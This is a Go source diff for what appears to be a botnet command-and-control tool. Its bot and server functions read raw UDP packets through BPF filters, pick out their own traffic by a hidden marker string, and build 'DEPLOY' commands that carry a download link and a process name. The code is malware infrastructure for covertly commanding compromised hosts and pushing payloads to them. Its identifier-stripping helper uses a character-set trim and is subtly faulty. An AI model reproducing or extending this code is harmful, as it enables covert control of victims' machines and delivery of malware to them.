@@ -23,6 +23,9 @@ import (
 	"github.com/google/gopacket/layers"
 )
 
+// How Packets are Marked
+var IDENTIFIER string
+
 // FilterRaw is a BPF struct containing raw instructions.
 // Generate with tcpdump udp and port 56969 -dd
 // or whatever filter you would like to generate
@@ -60,6 +63,41 @@ func checkEr(err error) {
 // #Stackoverflow
 func htons(i uint16) uint16 {
 	return (i<<8)&0xff00 | i>>8
+}
+
+func BothReadPacket(fd int, vm *bpf.VM) gopacket.Packet {
+	// Buffer for packet data that is read in
+	buf := make([]byte, 1500)
+
+	// Read in the packets
+	// num 		--> number of bytes
+	// sockaddr --> the sockaddr struct that the packet was read from
+	// err 		--> was there an error?
+	_, _, err := unix.Recvfrom(fd, buf, 0)
+
+	checkEr(err)
+
+	// Filter packet?
+	// numBytes	--> Number of bytes
+	// err	--> Error you say?
+	numBytes, err := vm.Run(buf)
+	checkEr(err)
+	if numBytes == 0 {
+		// Change "continue" to return for routine logic
+		return nil // 0 means that the packet should be dropped
+		// Here we are just "ignoring" the packet and moving on to the next one
+	}
+
+	// Parse packet... hopefully
+	packet := gopacket.NewPacket(buf, layers.LayerTypeEthernet, gopacket.Default)
+	if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
+		// Make sure this is my packet
+		if strings.Contains(string(packet.ApplicationLayer().Payload()), "cHNvdmF5YQ") {
+			return packet
+		}
+		return nil
+	}
+	return nil
 }
 
 // ServerReadPacket reads packets from a socket file descriptor (fd)
@@ -110,7 +148,7 @@ func ServerReadPacket(fd int, vm *bpf.VM) gopacket.Packet {
 // vm 	--> BPF VM that contains the BPF Program
 //
 // Returns 	--> None
-func BotReadPacket(fd int, vm *bpf.VM) (gopacket.Packet, bool) {
+func BotReadPacket(fd int, vm *bpf.VM) gopacket.Packet {
 
 	// Buffer for packet data that is read in
 	buf := make([]byte, 1500)
@@ -130,7 +168,7 @@ func BotReadPacket(fd int, vm *bpf.VM) (gopacket.Packet, bool) {
 	checkEr(err)
 	if numBytes == 0 {
 		// Change "continue" to return for routine logic
-		return nil, false // 0 means that the packet should be dropped
+		return nil // 0 means that the packet should be dropped
 		// Here we are just "ignoring" the packet and moving on to the next one
 	}
 
@@ -138,14 +176,12 @@ func BotReadPacket(fd int, vm *bpf.VM) (gopacket.Packet, bool) {
 	packet := gopacket.NewPacket(buf, layers.LayerTypeEthernet, gopacket.Default)
 	if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {
 		// Make sure this is my packet
-		if strings.Contains(string(packet.ApplicationLayer().Payload()), "COMMAND:") {
-			return packet, false
-		} else if strings.Contains(string(packet.ApplicationLayer().Payload()), "TARGET:") {
-			return packet, true
+		if strings.Contains(string(packet.ApplicationLayer().Payload()), "cHNvdmF5YQ") {
+			return packet
 		}
-		return nil, false
+		return nil
 	}
-	return nil, false
+	return nil
 }
 
 // CreateAddrStruct creates a "syscall.ScokaddrLinklayer" struct used
@@ -408,13 +444,17 @@ func CreateCommand(cmd string) (command string) {
 	return command
 }
 
-func CreateDeploy(cmd string) (command string) {
-	command = "DEPLOY: " + path
+func CreateDeploy(link string, pname string) (command string) {
+	command = "DEPLOY: " + fmt.Sprintf("%v %v", link, pname)
 	return command
 }
 
-// CreateTargetCommand creates a target command string
-func CreateTargetCommand(cmd string, ip string) (command string) {
-	command = "TARGET: " + ip + " " + cmd
+func AddIdentifier(cmd string) (command string) {
+	command = IDENTIFIER + cmd
 	return command
+}
+
+func RemoveIdentifier(data string) (command string) {
+	newData := strings.Trim(data, IDENTIFIER)
+	return newData
 }
